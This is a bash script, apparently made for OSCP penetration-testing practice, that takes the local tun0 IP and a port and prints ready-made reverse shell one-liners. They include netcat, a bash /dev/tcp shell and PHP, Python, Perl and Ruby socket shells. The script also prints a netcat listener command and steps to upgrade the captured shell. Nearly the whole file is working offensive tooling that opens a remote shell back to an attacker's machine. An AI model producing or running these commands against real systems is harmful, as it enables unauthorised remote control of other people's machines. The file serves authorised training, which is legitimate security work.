#!/bin/bash

#------------------------------------------------------------------------------------------------------------------------
# Revere shell code generator
# Author: ooty99 
#------------------------------------------------------------------------------------------------------------------------
# This simple script is designed to save precious time during the OSCP. I wrote it because I got tired of constantly 
# copy/pasting one-line reverse shell commands, then opening another terminal pane, using ifconfig, scrolling to tun0,
# then having to move the cursor around and replace <IP ADDR> and <PORT> in the pasted command. This hopefully cuts down 
# on some of the extra steps and keeps focus on the exploit. 

# Feel free to modify anything you would like! Good luck.
#------------------------------------------------------------------------------------------------------------------------

#Settings colors to distinguish output 
CYAN='\033[0;36m'
NOCOLOR='\033[0m'


# Find the IP of the tun0 interface, change tun0 to something else if desired
tun0="$(ip addr show | grep tun0 |grep -o 'inet [0-9]*\.[0-9]*\.[0-9]*\.[0-9]*' | grep -o '[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*')"

# Take user input to set the listening port
read -p "Enter the port you will listen on: " port

# List out the useful stuff 
echo "+------------------------------------------------------+"
echo "||||||||||||| Easy Reverse Shell Generator |||||||||||||"
echo "+------------------------------------------------------+"
echo ""
echo "Your tun0 IP: $tun0"
echo ""
echo "Listen with:  nc -lvp $port"
echo ""
echo "Reverse Shell Commands"
echo "-------------------------------------------------------"
echo "netcat with -e option:"
echo -e "${CYAN}nc -e /bin/bash $tun0 $port${NOCOLOR}"
echo ""
echo "netcat without -e option:"
echo -e "${CYAN}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $tun0 $port >/tmp/f${NOCOLOR}"
echo ""
echo "Standard reverse TCP:"
echo -e "${CYAN}bash -i >& /dev/tcp/$tun0/$port 0>&1${NOCOLOR}"
echo ""
echo "Programming Language Reverse Shells"
echo "-------------------------------------------------------"
echo "PHP:"
echo -e "${CYAN}php -r '$sock=fsockopen("$tun0",$port);exec("/bin/sh -i <&3 >&3 2>&3");'${NOCOLOR}"
echo ""
echo "Python:"
echo -e "${CYAN}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$tun0",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'${NOCOLOR}"
echo ""
echo "Perl:"
echo -e "${CYAN}perl -e 'use Socket;$i="$tun0";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'${NOCOLOR}"
echo ""
echo "Ruby:"
echo -e "${CYAN}ruby -rsocket -e'f=TCPSocket.open("$tun0",$port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'${NOCOLOR}"
echo ""
echo "Upgrade Your Shell"
echo "-------------------------------------------------------"
echo -e "1) ${CYAN}python -c 'import pty; pty.spawn("/bin/bash")'${NOCOLOR}"
echo "2) Enter ctl+z in terminal that is running reverse shell"
echo -e "3) ${CYAN}stty raw -echo${NOCOLOR}"
echo -e "4) ${CYAN}fg${NOCOLOR}"
echo -e "5) ${CYAN}export SHELL=bash${NOCOLOR}"
echo -e "6) ${CYAN}export TERM=xterm-256color${NOCOLOR}"
echo ""
